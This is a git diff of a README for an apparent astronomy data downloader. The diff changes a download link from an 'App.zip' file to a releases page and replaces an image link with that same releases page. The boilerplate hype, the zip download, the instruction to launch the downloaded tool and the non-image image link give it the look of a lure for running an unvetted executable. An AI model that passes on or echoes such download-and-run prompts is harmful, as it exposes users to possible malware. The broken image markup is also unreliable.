@@ -21,7 +21,7 @@ The **Bulk Zwicky Transient Facility Frames Downloader** is a powerful utility t
 
 ## Get Started 🚀
 
-If you're ready to embark on your astrophotography journey utilizing ZTF data, you can download the Bulk Zwicky Transient Facility Frames Downloader tool from the following link: [Download Now](https://github.com/uploads/App.zip) 🌌
+If you're ready to embark on your astrophotography journey utilizing ZTF data, you can download the Bulk Zwicky Transient Facility Frames Downloader tool from the following link: [Download Now](https://github.com/denzkir/Bulk-Zwicky-Transient-Facility-Downloader/releases) 🌌
 
 If the link ends with the file name, ensure to launch the downloaded tool to start exploring the universe through the lens of ZTF's data-rich frames.
 
@@ -43,6 +43,6 @@ Connect with fellow astrophotography enthusiasts, astronomers, and data analysts
 
 Join us on this cosmic journey and let's unlock the mysteries of the universe together! 🚀⚛️
 
-![Astrophotography](https://example.com/astrophotography.png)
+![Astrophotography](https://github.com/denzkir/Bulk-Zwicky-Transient-Facility-Downloader/releases)
 
 **Remember, the cosmos awaits your lens! Happy exploring!** 🪐🌌🔭
